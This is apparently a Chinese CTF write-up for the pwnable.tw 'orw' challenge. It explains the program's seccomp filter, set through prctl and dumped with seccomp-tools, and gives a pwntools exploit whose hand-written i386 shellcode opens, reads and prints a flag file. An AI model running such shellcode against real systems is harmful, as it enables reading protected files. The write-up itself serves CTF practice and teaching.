---
layout: post
title: prctl&pwnable_orw
category: pwn
tags: [pwn]
---




## 相关工具
seccomp-tools https://github.com/david942j/seccomp-tools

## orw
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
拽进Ida，根据prctl函数可以确定几个结构体。
```
  qmemcpy(&sock_filter, stru_8048640, 0x60u);
  LOWORD(sfp.len) = 12;
  sfp.filter = &sock_filter;
  prctl(38, 1, 0, 0, 0);                        // prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
  prctl(22, 2, &sfp);                           // prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
```

![img](/assets/images/2020-02-07-prctl&pwnable_orw/struct3.png)
![img](/assets/images/2020-02-07-prctl&pwnable_orw/struct1.png)


整个程序就是让我们输入一段shellcode，去打开提示所说的 **/home/orw/flag** 


```
➜  seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```
能用的函数：rt_sigreturn、sigreturn、exit_group、exit、open、read、write

## exp
```python
from pwn import *
p = remote('chall.pwnable.tw',10001)
shellcode = ''
#open(/home/orw/flag,0,0)
shellcode+=asm('mov eax,0x5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;int 0x80;')
#read(3,/home/orw/flag,0x30)
shellcode +=asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x30;int 0x80;')
#write(1,/home/orw/flag,0x30)
shellcode+=asm('mov eax,0x4; mov ebx,0x1;int 0x80;')
p.recvuntil(':')
p.send(shellcode)
p.interactive()
```

在 http://syscalls.kernelgrok.com/ 可以看到调用号和各寄存器作用